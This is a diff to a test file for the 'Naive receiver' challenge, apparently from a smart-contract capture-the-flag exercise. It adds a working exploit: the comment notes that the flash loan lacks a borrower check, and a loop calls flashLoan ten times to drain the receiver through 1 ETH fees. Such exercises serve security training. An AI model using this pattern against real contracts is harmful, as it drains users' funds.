@@ -50,8 +50,7 @@ describe("[Challenge] Naive receiver", function () {
     });
 
     it("Exploit", async function () {
-        /** CODE YOUR EXPLOIT HERE */
-
+        /* Because it will take 1 ETH as fee and the flashloan doesn't check whether msg.sender and borrower are the same */
         for (let i = 0; i < 10; i++) {
             await this.pool.flashLoan(this.receiver.address, ETHER_IN_RECEIVER);
         }
